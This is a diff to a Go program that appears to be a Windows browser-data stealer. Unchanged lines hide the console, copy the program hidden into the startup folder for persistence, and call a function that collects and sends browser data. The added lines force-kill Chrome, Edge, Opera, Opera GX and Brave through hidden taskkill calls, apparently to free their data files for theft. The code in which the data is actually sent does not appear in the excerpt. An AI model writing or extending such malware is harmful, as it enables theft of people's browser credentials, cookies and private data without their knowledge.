@@ -23,23 +23,21 @@ const (
 )
 
 func init() {
-	// Ocultar consola
 	hideConsole()
 
-	// Auto-copia al inicio
 	copyToStartup()
 }
 
 func main() {
-	// Esperar antes de comenzar
 	time.Sleep(30 * time.Second)
 
-	// Directorio temporal
+	killAllBrowsers()
+	time.Sleep(5 * time.Second)
+
 	tmpDir := filepath.Join(os.TempDir(), fmt.Sprintf("tmp_%d", time.Now().UnixNano()))
 	defer os.RemoveAll(tmpDir)
 	_ = os.MkdirAll(tmpDir, os.ModePerm)
 
-	// Recolectar datos del navegador
 	collectAndSendBrowserData(tmpDir)
 }
 
@@ -115,4 +113,32 @@ func copyToStartup() {
 		_ = os.WriteFile(startupPath, input, 0644)
 		_ = exec.Command("attrib", "+h", startupPath).Run()
 	}
+}
+
+func killBrowser(browserName string) {
+	processNameMap := map[string]string{
+		"chrome":  "chrome.exe",
+		"edge":    "msedge.exe",
+		"opera":   "opera.exe",
+		"operagx": "opera_gx.exe",
+		"brave":   "brave.exe",
+	}
+	if name, ok := processNameMap[browserName]; ok {
+		cmd := exec.Command("taskkill", "/F", "/T", "/IM", name)
+
+		cmd.SysProcAttr = &syscall.SysProcAttr{
+			HideWindow: true,
+		}
+
+		_ = cmd.Run()
+	}
+}
+
+func killAllBrowsers() {
+	targetBrowsers := []string{"chrome", "edge", "opera", "operagx", "brave"}
+
+	for _, browserName := range targetBrowsers {
+		killBrowser(browserName)
+	}
+	time.Sleep(1 * time.Second)
 }
